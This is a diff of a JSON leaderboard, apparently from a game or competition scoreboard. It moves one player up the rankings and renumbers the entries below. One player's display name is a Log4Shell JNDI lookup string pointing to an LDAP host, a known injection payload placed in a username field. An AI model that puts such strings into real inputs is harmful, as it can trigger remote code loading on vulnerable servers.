@@ -157,45 +157,45 @@
     },
     {
         "position": 27,
+        "user_id": "654dbc480cd0edf9ee8d90e66a34e92f",
+        "name": "L\u00f8va",
+        "points": 160
+    },
+    {
+        "position": 28,
         "user_id": "93fa4c8b8341dacd7565b0a073b3d0f9",
         "name": "thronic",
         "points": 160
     },
     {
-        "position": 28,
+        "position": 29,
         "user_id": "72c1cc6250a04e68e141585023a3e41e",
         "name": "${jndi:ldap://anvilshop.utl/x}",
         "points": 160
     },
     {
-        "position": 29,
+        "position": 30,
         "user_id": "2a3c4718d2588ddd005eab90ba1fd351",
         "name": "FLINK BABBAGE",
         "points": 159
     },
     {
-        "position": 30,
+        "position": 31,
         "user_id": "62190e3b89569a69b6fef71468254069",
         "name": "SVAK AGENT",
         "points": 152
     },
     {
-        "position": 31,
+        "position": 32,
         "user_id": "c1829e44eb2b155e5e534ae91b0cd26c",
         "name": "fjellape",
         "points": 152
     },
     {
-        "position": 32,
+        "position": 33,
         "user_id": "2edb8fcc49aa6efb6d5498fa53915583",
         "name": "Joey",
         "points": 152
-    },
-    {
-        "position": 33,
-        "user_id": "654dbc480cd0edf9ee8d90e66a34e92f",
-        "name": "L\u00f8va",
-        "points": 150
     },
     {
         "position": 34,
